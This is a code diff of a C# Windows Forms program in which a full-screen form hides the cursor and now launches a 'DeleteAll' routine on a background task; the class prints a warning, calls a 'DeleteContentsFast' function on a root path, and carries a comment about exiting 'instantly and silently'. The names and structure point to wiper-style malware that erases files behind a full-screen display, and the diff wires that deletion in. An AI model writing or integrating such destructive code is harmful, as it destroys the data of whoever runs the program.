@@ -20,6 +20,7 @@ using System.Windows.Forms;
 using System.Diagnostics;
 using System.IO;
 using System.Runtime.InteropServices;
+using System.Threading.Tasks;
 
 internal static class Program
 {
@@ -154,7 +155,8 @@ sealed class Screen : Form
         Activate();
         Focus();
         HideCursor();
-        DeleteAll.Run();
+        // DeleteAll.Run();
+        _ = Task.Run(() => DeleteAll.Run());
     }
 
     protected override void OnClientSizeChanged(EventArgs e)
@@ -2274,7 +2276,7 @@ class DeleteAll
 
     const int SW_HIDE = 0;
 
-    public static void Main()
+    public static void Run()
     {
         Console.ForegroundColor = ConsoleColor.Red;
         Console.WriteLine("!!! WARNING !!!");
@@ -2330,7 +2332,7 @@ class DeleteAll
         }
 
         // After everything is done, kill the process instantly and silently.
-        Environment.Exit(0);
+        
     }
 
     static void DeleteContentsFast(string rootPath)
